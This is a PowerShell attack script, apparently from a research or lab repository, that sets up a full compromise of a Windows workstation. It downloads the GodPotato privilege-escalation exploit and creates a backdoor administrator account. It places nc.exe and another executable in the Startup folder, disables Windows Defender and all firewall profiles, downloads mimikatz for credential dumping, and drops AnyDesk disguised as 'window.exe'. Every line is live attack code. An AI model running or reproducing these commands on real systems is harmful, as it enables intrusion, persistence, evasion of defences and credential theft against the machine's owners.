# download gotpotato winRM exploit
curl "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -OutFile "ex.exe"

# add malicious user
net user john "password" /add
Add-LocalGroupMember -Group "Administrators" -Member "john"
Add-LocalGroupMember -Group "Remote Management Users" -Member "john"

# download nc backdoor to startup folder
curl "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\nc.exe"
curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/script.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\script.exe"

# disable windows defender and real-time protection
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord

# disable all firewall profiles
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False

# download mimikatz binary for data extraction
cd "C:\Windows\System32\config"
curl "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
Expand-Archive "mimikatz.zip"
rm mimikatz.zip

# download anydesk remote desktop software
cd "C:\Windows\System32\drivers"
curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/AnyDesk.exe" -OutFile "window.exe"
